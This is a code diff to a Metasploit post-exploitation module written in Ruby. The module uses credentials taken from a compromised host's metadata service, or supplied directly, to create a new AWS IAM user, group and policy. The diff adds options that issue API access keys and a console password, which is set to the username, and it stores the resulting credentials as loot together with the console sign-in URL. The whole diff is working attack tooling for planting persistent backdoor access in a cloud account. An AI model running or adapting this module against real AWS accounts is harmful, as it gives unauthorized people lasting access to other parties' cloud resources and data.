@@ -22,7 +22,10 @@ class MetasploitModule < Msf::Post
         'License'        => MSF_LICENSE,
         'Platform'       => %w(unix),
         'SessionTypes'   => %w(shell meterpreter),
-        'Author'         => ['Javier Godinez <godinezj[at]gmail.com>'],
+        'Author'         => [
+          'Javier Godinez <godinezj[at]gmail.com>',
+          'Jon Hart <jon_hart@rapid7.com>'
+        ],
         'References'     => [
           [ 'URL', 'https://github.com/devsecops/bootcamp/raw/master/Week-6/slides/june-DSO-bootcamp-week-six-lesson-three.pdf' ]
         ]
@@ -32,6 +35,8 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptString.new('IAM_USERNAME', [false, 'Name of the user to be created (leave empty or unset to use a random name)', '']),
+        OptBool.new('CREATE_API', [true, 'Add access key ID and secret access key to account (API, CLI, and SDK access)', true]),
+        OptBool.new('CREATE_CONSOLE', [true, 'Create an account with a password for accessing the AWS management console', true]),
         OptString.new('AccessKeyId', [false, 'AWS access key', '']),
         OptString.new('SecretAccessKey', [false, 'AWS secret key', '']),
         OptString.new('Token', [false, 'AWS session token', ''])
@@ -50,6 +55,12 @@ class MetasploitModule < Msf::Post
     deregister_options('VHOST')
   end
 
+  def setup
+    if !(datastore['CREATE_API'] || datastore['CREATE_CONSOLE'])
+      fail_with(Failure::BadConfig, "Must set one or both of CREATE_API and CREATE_CONSOLE")
+    end
+  end
+
   def run
     # setup creds for making IAM API calls
     creds = metadata_creds
@@ -66,41 +77,82 @@ class MetasploitModule < Msf::Post
       creds['Token'] = datastore['Token'] unless datastore['Token'].blank?
     end
 
+    results = {}
+
     # create user
     username = datastore['IAM_USERNAME'].blank? ? Rex::Text.rand_text_alphanumeric(16) : datastore['IAM_USERNAME']
     print_status("Creating user: #{username}")
     action = 'CreateUser'
     doc = call_iam(creds, 'Action' => action, 'UserName' => username)
     print_results(doc, action)
+    results['UserName'] = username
 
     # create group
-    print_status("Creating group: #{username}")
+    groupname = username
+    print_status("Creating group: #{groupname}")
     action = 'CreateGroup'
-    doc = call_iam(creds, 'Action' => action, 'GroupName' => username)
+    doc = call_iam(creds, 'Action' => action, 'GroupName' => groupname)
     print_results(doc, action)
+    results['GroupName'] = groupname
 
     # create group policy
-    print_status("Creating group policy: #{username}")
+    policyname = username
+    print_status("Creating group policy: #{policyname}")
     pol_doc = datastore['IAM_GROUP_POL']
     action = 'PutGroupPolicy'
-    doc = call_iam(creds, 'Action' => action, 'GroupName' => username, 'PolicyName' => username, 'PolicyDocument' => URI.encode(pol_doc))
+    doc = call_iam(creds, 'Action' => action, 'GroupName' => groupname, 'PolicyName' => policyname, 'PolicyDocument' => URI.encode(pol_doc))
     print_results(doc, action)
 
     # add user to group
-    print_status("Adding user (#{username}) to group: #{username}")
+    print_status("Adding user (#{username}) to group: #{groupname}")
     action = 'AddUserToGroup'
-    doc = call_iam(creds, 'Action' => action, 'UserName' => username, 'GroupName' => username)
+    doc = call_iam(creds, 'Action' => action, 'UserName' => username, 'GroupName' => groupname)
     print_results(doc, action)
 
-    # create API keys
-    print_status("Creating API Keys for #{username}")
-    action = 'CreateAccessKey'
-    doc = call_iam(creds, 'Action' => action, 'UserName' => username)
-    doc = print_results(doc, action)
 
-    return if doc.nil?
-    path = store_loot(doc['AccessKeyId'], 'text/plain', datastore['RHOST'], doc.to_json)
-    print_good("API keys stored at: " + path)
+    if datastore['CREATE_API']
+      # create API keys
+      print_status("Creating API Keys for #{username}")
+      action = 'CreateAccessKey'
+      response = call_iam(creds, 'Action' => action, 'UserName' => username)
+      doc = print_results(response, action)
+      results['SecretAccessKey'] = doc['SecretAccessKey']
+      results['AccessKeyId'] = doc['AccessKeyId']
+    end
+
+    if datastore['CREATE_CONSOLE']
+      print_status("Creating password for #{username}")
+      password = username
+      action = 'CreateLoginProfile'
+      response = call_iam(creds, 'Action' => action, 'UserName' => username, 'Password' => password)
+      doc = print_results(response, action)
+      results['Password'] = password
+    end
+
+    action = 'GetUser'
+    response = call_iam(creds, 'Action' => action, 'UserName' => username)
+    doc = print_results(response, action)
+    arn = doc['Arn']
+    results['AccountId'] = arn[/^arn:aws:iam::(\d+):/,1]
+
+    keys = results.keys
+    table = Rex::Text::Table.new(
+      'Header' => "AWS Account Information",
+      'Columns' => keys
+    )
+    table << results.values
+    print_line(table.to_s)
+
+    if results.key?('AccessKeyId')
+      print_good("AWS CLI/SDK etc can be accessed by configuring with the above listed values")
+    end
+
+    if results.key?('Password')
+      print_good("AWS console URL https://#{results['AccountId']}.signin.aws.amazon.com/console may be used to access this account")
+    end
+
+    path = store_loot('AWS credentials', 'text/json', session, results.to_json)
+    print_good("AWS loot stored at: " + path)
   end
 
   def metadata_creds
